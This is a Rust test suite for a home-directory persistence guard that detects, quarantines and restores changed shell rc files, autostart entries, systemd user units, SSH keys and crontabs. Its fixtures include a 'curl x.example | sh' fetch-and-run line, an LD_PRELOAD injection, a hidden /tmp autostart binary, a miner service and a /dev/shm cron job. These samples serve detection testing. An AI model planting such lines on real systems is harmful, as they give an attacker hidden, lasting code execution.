//! End-to-end tests of the guard against a temporary home directory.

use std::fs;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::Path;
use std::sync::Arc;

use wachposten_core::crontab::MemoryCrontab;
use wachposten_core::{
    CRONTAB_PATH, Change, Config, DecisionError, Guard, Kind, Outcome, Severity, Status,
};

struct Env {
    home: tempfile::TempDir,
    crontab: Arc<MemoryCrontab>,
}

impl Env {
    fn new() -> Env {
        let home = tempfile::tempdir().unwrap();
        fs::write(home.path().join(".bashrc"), "alias ll='ls -l'\n").unwrap();
        fs::create_dir_all(home.path().join(".config/autostart")).unwrap();
        fs::write(
            home.path().join(".config/autostart/nextcloud.desktop"),
            "[Desktop Entry]\nExec=/usr/bin/nextcloud\n",
        )
        .unwrap();
        Env {
            home,
            crontab: Arc::new(MemoryCrontab::default()),
        }
    }

    fn path(&self, rel: &str) -> std::path::PathBuf {
        self.home.path().join(rel)
    }

    fn guard(&self) -> Guard {
        let config = Config {
            home: self.home.path().to_path_buf(),
            data_dir: self.home.path().join(".local/share/wachposten"),
            crontab: true,
            systemctl: false,
            system: false,
            verify_packages: false,
        };
        Guard::with_crontab(config, Box::new(self.crontab.clone())).unwrap()
    }

    fn initialized(&self) -> Guard {
        let mut g = self.guard();
        assert_eq!(g.initialize().unwrap(), 2);
        assert!(g.rescan().unwrap().is_empty());
        g
    }
}

fn write(path: &Path, content: &str) {
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, content).unwrap();
}

#[test]
fn baseline_is_taken_silently() {
    let env = Env::new();
    let g = env.initialized();
    assert!(g.store().open_events().unwrap().is_empty());
    assert!(g.is_initialized().unwrap());
}

#[test]
fn new_autostart_entry_is_flagged_and_removed() {
    let env = Env::new();
    let mut g = env.initialized();
    let entry = env.path(".config/autostart/update.desktop");
    write(
        &entry,
        "[Desktop Entry]\nType=Application\nExec=/tmp/.x/upd --silent\nNoDisplay=true\n",
    );

    let events = g.rescan().unwrap();
    assert_eq!(events.len(), 1);
    let ev = &events[0];
    assert_eq!(ev.kind, Kind::Autostart);
    assert_eq!(ev.change, Change::Created);
    assert_eq!(ev.severity, Severity::Suspicious);
    let rules: Vec<_> = ev.findings.iter().map(|f| f.rule.as_str()).collect();
    assert!(rules.contains(&"temp-path"), "{rules:?}");
    assert!(rules.contains(&"hidden-dir"), "{rules:?}");

    // A second scan does not repeat the event.
    assert!(g.rescan().unwrap().is_empty());

    let outcome = g.remove(ev.id, Some(ev.new_hash())).unwrap();
    let Outcome::Removed {
        quarantine_id: Some(qid),
    } = outcome
    else {
        panic!("unexpected {outcome:?}");
    };
    assert!(!entry.exists());
    let data = env.path(&format!(".local/share/wachposten/quarantine/{qid}.bin"));
    assert_eq!(
        fs::metadata(&data).unwrap().permissions().mode() & 0o777,
        0o400
    );
    assert!(g.rescan().unwrap().is_empty());
    assert_eq!(
        g.store().event(ev.id).unwrap().unwrap().status,
        Status::Removed
    );

    // Restoring brings it back and makes it the baseline.
    g.restore(qid, false).unwrap();
    assert!(fs::read_to_string(&entry).unwrap().contains("/tmp/.x/upd"));
    assert!(g.rescan().unwrap().is_empty());
    assert!(g.restore(qid, false).is_err());
}

#[test]
fn modified_bashrc_shows_added_lines_and_is_restored() {
    let env = Env::new();
    let mut g = env.initialized();
    let rc = env.path(".bashrc");
    fs::set_permissions(&rc, fs::Permissions::from_mode(0o640)).unwrap();
    g.initialize().unwrap();
    fs::write(
        &rc,
        "alias ll='ls -l'\nexport LD_PRELOAD=$HOME/.cache/libsys.so\n",
    )
    .unwrap();

    let ev = g.rescan().unwrap().remove(0);
    assert_eq!(ev.change, Change::Modified);
    assert_eq!(ev.added_lines, ["export LD_PRELOAD=$HOME/.cache/libsys.so"]);
    assert_eq!(ev.findings[0].rule, "preload");

    g.remove(ev.id, None).unwrap();
    assert_eq!(fs::read_to_string(&rc).unwrap(), "alias ll='ls -l'\n");
    assert_eq!(
        fs::metadata(&rc).unwrap().permissions().mode() & 0o777,
        0o640
    );
    assert!(g.rescan().unwrap().is_empty());
}

#[test]
fn allow_makes_change_the_baseline() {
    let env = Env::new();
    let mut g = env.initialized();
    let rc = env.path(".bashrc");
    fs::write(&rc, "alias ll='ls -l'\nexport EDITOR=vim\n").unwrap();
    let ev = g.rescan().unwrap().remove(0);
    assert_eq!(ev.severity, Severity::Notice);
    assert_eq!(
        g.allow(ev.id, Some(ev.new_hash())).unwrap(),
        Outcome::Allowed
    );
    assert!(g.rescan().unwrap().is_empty());
    let err = g.allow(ev.id, None).unwrap_err();
    assert!(matches!(
        err.downcast_ref::<DecisionError>(),
        Some(DecisionError::AlreadyResolved(_))
    ));
}

#[test]
fn decision_on_stale_message_is_refused() {
    let env = Env::new();
    let mut g = env.initialized();
    let rc = env.path(".bashrc");
    fs::write(&rc, "alias ll='ls -l'\nexport A=1\n").unwrap();
    let first = g.rescan().unwrap().remove(0);
    fs::write(&rc, "alias ll='ls -l'\nexport A=1\ncurl x.example | sh\n").unwrap();

    // The file changed after the message was shown: refuse before the next scan…
    let err = g.allow(first.id, Some(first.new_hash())).unwrap_err();
    assert!(matches!(err.downcast_ref(), Some(DecisionError::Stale)));

    // …and after it, a new event describes the new state and the noted one is closed.
    let second = g.rescan().unwrap().remove(0);
    assert_ne!(second.id, first.id);
    assert_eq!(second.status, Status::Open);
    assert_eq!(second.added_lines, ["curl x.example | sh"]);
    assert!(second.wants_popup());
    let err = g.allow(first.id, Some(first.new_hash())).unwrap_err();
    assert!(matches!(
        err.downcast_ref(),
        Some(DecisionError::AlreadyResolved(_))
    ));
    g.allow(second.id, Some(second.new_hash())).unwrap();
    assert!(g.rescan().unwrap().is_empty());
}

#[test]
fn revert_and_delete_close_events_without_question() {
    let env = Env::new();
    let mut g = env.initialized();
    let rc = env.path(".bashrc");
    fs::write(&rc, "changed\nnohup ~/.x &\n").unwrap();
    let ev = g.rescan().unwrap().remove(0);
    assert_eq!(ev.status, Status::Open);
    assert!(!ev.wants_popup());
    fs::write(&rc, "alias ll='ls -l'\n").unwrap();
    assert!(g.rescan().unwrap().is_empty());
    assert_eq!(
        g.store().event(ev.id).unwrap().unwrap().status,
        Status::Reverted
    );

    fs::remove_file(env.path(".config/autostart/nextcloud.desktop")).unwrap();
    assert!(g.rescan().unwrap().is_empty());
    let last = &g.store().recent_events(1).unwrap()[0];
    assert_eq!(last.change, Change::Deleted);
    assert_eq!(last.status, Status::Accepted);
    assert!(g.store().open_events().unwrap().is_empty());
}

#[test]
fn systemd_enable_symlink_and_ssh_key() {
    let env = Env::new();
    let mut g = env.initialized();
    let unit = env.path(".config/systemd/user/miner.service");
    write(&unit, "[Service]\nExecStart=%h/.x/miner\n");
    let wants = env.path(".config/systemd/user/default.target.wants");
    fs::create_dir_all(&wants).unwrap();
    symlink(&unit, wants.join("miner.service")).unwrap();
    write(
        &env.path(".ssh/authorized_keys"),
        "ssh-ed25519 AAAAC3Nz test@host\n",
    );

    let events = g.rescan().unwrap();
    assert_eq!(events.len(), 3);
    let link = events
        .iter()
        .find(|e| e.path.ends_with("wants/miner.service"))
        .unwrap();
    assert!(matches!(
        link.new_entry,
        Some(wachposten_core::Entry::Symlink { .. })
    ));
    let key = events.iter().find(|e| e.kind == Kind::Ssh).unwrap();
    assert_eq!(key.severity, Severity::Notice);
    assert_eq!(key.status, Status::Open);
    // A program in a hidden folder is unusual but not clearly bad: a warning, no question.
    // (The link points into the test's temporary folder and therefore is dangerous.)
    let unit_ev = events
        .iter()
        .find(|e| e.path == unit.to_str().unwrap())
        .unwrap();
    assert_eq!(unit_ev.status, Status::Open);
    assert!(!unit_ev.wants_popup());

    for ev in &events {
        g.remove(ev.id, None).unwrap();
    }
    assert!(!unit.exists());
    assert!(fs::symlink_metadata(wants.join("miner.service")).is_err());
    assert!(!env.path(".ssh/authorized_keys").exists());
}

#[test]
fn harmless_change_is_noted_and_can_be_undone() {
    let env = Env::new();
    let mut g = env.initialized();
    let rc = env.path(".bashrc");
    fs::write(&rc, "alias ll='ls -l'\nexport EDITOR=vim\n").unwrap();
    let ev = g.rescan().unwrap().remove(0);
    assert_eq!(ev.status, Status::Noted);
    assert!(!ev.wants_popup());
    assert!(g.store().open_events().unwrap().is_empty());
    // Already part of the baseline: the next scan is quiet.
    assert!(g.rescan().unwrap().is_empty());

    let desktop = env.path(".config/autostart/discord.desktop");
    write(&desktop, "[Desktop Entry]\nExec=/usr/bin/discord\n");
    let created = g.rescan().unwrap().remove(0);
    assert_eq!(created.status, Status::Noted);

    g.remove(ev.id, Some(ev.new_hash())).unwrap();
    assert_eq!(fs::read_to_string(&rc).unwrap(), "alias ll='ls -l'\n");
    g.remove(created.id, None).unwrap();
    assert!(!desktop.exists());
    assert!(g.rescan().unwrap().is_empty());
    assert_eq!(
        g.store().event(ev.id).unwrap().unwrap().status,
        Status::Removed
    );
}

#[test]
fn crontab_changes_are_undone() {
    let env = Env::new();
    *env.crontab.0.lock().unwrap() = Some(b"0 3 * * * /usr/bin/backup\n".to_vec());
    let mut g = env.guard();
    g.initialize().unwrap();
    *env.crontab.0.lock().unwrap() =
        Some(b"0 3 * * * /usr/bin/backup\n*/5 * * * * /dev/shm/.k\n".to_vec());

    let ev = g.rescan().unwrap().remove(0);
    assert_eq!(ev.path, CRONTAB_PATH);
    assert_eq!(ev.findings[0].rule, "temp-path");
    g.remove(ev.id, None).unwrap();
    assert_eq!(
        env.crontab.0.lock().unwrap().as_deref(),
        Some(&b"0 3 * * * /usr/bin/backup\n"[..])
    );
}

#[test]
fn ignores_unrelated_files() {
    let env = Env::new();
    let mut g = env.initialized();
    fs::write(env.path(".zsh_history"), "ls\n").unwrap();
    fs::write(env.path(".config/autostart/notes.txt"), "x").unwrap();
    fs::write(env.path(".config/autostart/x.desktop~"), "x").unwrap();
    assert!(g.rescan().unwrap().is_empty());
}

#[test]
fn old_database_is_migrated() {
    let env = Env::new();
    let data = env.path(".local/share/wachposten");
    fs::create_dir_all(&data).unwrap();
    // Schema of the first release: no uid columns.
    let conn = rusqlite::Connection::open(data.join("state.db")).unwrap();
    conn.execute_batch(
        "CREATE TABLE events (id INTEGER PRIMARY KEY AUTOINCREMENT, created_at INTEGER NOT NULL,
           updated_at INTEGER NOT NULL, path TEXT NOT NULL, kind TEXT NOT NULL, change TEXT NOT NULL,
           severity TEXT NOT NULL, status TEXT NOT NULL, old_hash TEXT NOT NULL, new_type TEXT,
           new_hash TEXT, new_mode INTEGER, new_size INTEGER, new_content BLOB, new_link_target TEXT,
           findings TEXT NOT NULL, added_lines TEXT NOT NULL, resolved_at INTEGER, quarantine_id INTEGER);
         INSERT INTO events (created_at, updated_at, path, kind, change, severity, status, old_hash,
           findings, added_lines) VALUES (1, 1, '/x', 'shell-rc', 'modified', 'notice', 'open', 'a', '', '');
         CREATE TABLE quarantine (id INTEGER PRIMARY KEY AUTOINCREMENT, created_at INTEGER NOT NULL,
           original_path TEXT NOT NULL, kind TEXT NOT NULL, entry_type TEXT NOT NULL, mode INTEGER NOT NULL,
           link_target TEXT, hash TEXT NOT NULL, event_id INTEGER, restored_at INTEGER);",
    )
    .unwrap();
    drop(conn);
    let g = env.guard();
    let ev = g.store().event(1).unwrap().unwrap();
    assert_eq!(ev.uid, None);
    assert!(g.store().quarantine_items().unwrap().is_empty());
}

#[test]
fn package_files_are_recognised() {
    let has_pm = ["/usr/bin/rpm", "/usr/bin/dpkg"]
        .iter()
        .any(|p| Path::new(p).exists());
    if !has_pm || !Path::new("/usr/bin/ls").exists() {
        return;
    }
    assert!(wachposten_core::pkg::installed_unchanged(Path::new(
        "/usr/bin/ls"
    )));
    let env = Env::new();
    assert!(!wachposten_core::pkg::installed_unchanged(
        &env.path(".bashrc")
    ));
}

#[test]
fn events_serialize_without_content() {
    let env = Env::new();
    let mut g = env.initialized();
    fs::write(env.path(".bashrc"), "changed\n").unwrap();
    let ev = g.rescan().unwrap().remove(0);
    let json = serde_json::to_string(&wachposten_core::ipc::strip(ev)).unwrap();
    assert!(json.contains("\"kind\":\"shell-rc\""));
    assert!(json.contains("\"content\":null"));
    let back: wachposten_core::Event = serde_json::from_str(&json).unwrap();
    assert_eq!(back.kind, Kind::ShellRc);
}
